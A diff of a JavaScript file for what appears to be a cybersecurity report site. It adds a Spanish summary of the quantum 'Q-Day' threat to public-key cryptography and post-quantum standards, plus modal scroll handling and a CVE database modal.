+        `,
+        "case-15": `
+            <strong>CONTEXTO:</strong> La inminente crisis criptográfica ('Q-Day') en la que las computadoras cuánticas criptográficamente relevantes (CRQC) romperán la criptografía de clave pública actual.<br><br>
+            <strong>ANÁLISIS TÉCNICO:</strong>
+            <ul>
+                <li><strong>Amenaza:</strong> El algoritmo de Shor que se ejecuta en un CRQC puede factorizar números primos grandes, haciendo que RSA, ECC y Diffie-Hellman queden obsoletos.</li>
+                <li><strong>Estrategia:</strong> Los estados-nación están empleando tácticas 'Harvest Now, Decrypt Later' (HNDL), almacenando tráfico cifrado para su futura descifrado.</li>
+            </ul><br>
+            <strong>IMPACTO Y EFECTOS:</strong> Compromiso total de comunicaciones seguras, firmas digitales y datos cifrados históricos.<br><br>
+            <strong>RESOLUCIÓN:</strong> Estandarización del NIST de algoritmos de criptografía poscuántica (PQC) (ej. Kyber, Dilithium). Impulso global para la agilidad criptográfica en los sistemas empresariales.
         `
     }
 };
@@ -313,6 +643,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const modal = document.getElementById('report-modal');
     const closeBtn = document.querySelector('.modal-close');
     const overlay = document.querySelector('.modal-overlay');
+    const reportsArchive = document.querySelector('.reports-archive'); // Seleziona il contenitore corretto
 
     document.querySelectorAll('.view-report-btn').forEach(button => {
         button.addEventListener('click', (e) => {
@@ -333,14 +664,16 @@ document.addEventListener('DOMContentLoaded', () => {
 
             // Mostra Modal
             modal.classList.add('active');
-            document.body.style.overflow = 'hidden'; 
+            // Blocca lo scroll solo sulla griglia, non sul body
+            if (reportsArchive) reportsArchive.style.overflowY = 'hidden'; 
         });
     });
 
-    // Chiusura Modal
+    // Chiusura Modal Report
     const closeModal = () => {
         modal.classList.remove('active');
-        document.body.style.overflow = 'auto';
+        // Ripristina lo scroll sulla griglia
+        if (reportsArchive) reportsArchive.style.overflowY = 'auto';
     };
 
     closeBtn.addEventListener('click', closeModal);
@@ -352,5 +685,27 @@ document.addEventListener('DOMContentLoaded', () => {
         setTimeout(() => {
             loadingOverlay.classList.add('hidden');
         }, 1800);
+    }
+    
+    // 5. GESTIONE MODALE CVE DATABASE (NUOVO)
+    const cveBtn = document.getElementById('open-cve-db');
+    const cveModal = document.getElementById('cve-modal');
+    
+    if (cveBtn && cveModal) {
+        const cveCloseBtn = cveModal.querySelector('.cve-close');
+        const cveOverlay = cveModal.querySelector('.modal-overlay');
+
+        cveBtn.addEventListener('click', () => {
+            cveModal.classList.add('active');
+            if (reportsArchive) reportsArchive.style.overflowY = 'hidden'; // Blocca scroll griglia
+        });
+
+        const closeCveModal = () => {
+            cveModal.classList.remove('active');
+            if (reportsArchive) reportsArchive.style.overflowY = 'auto'; // Ripristina scroll griglia
+        };
+
+        if (cveCloseBtn) cveCloseBtn.addEventListener('click', closeCveModal);
+        if (cveOverlay) cveOverlay.addEventListener('click', closeCveModal);
     }
 });
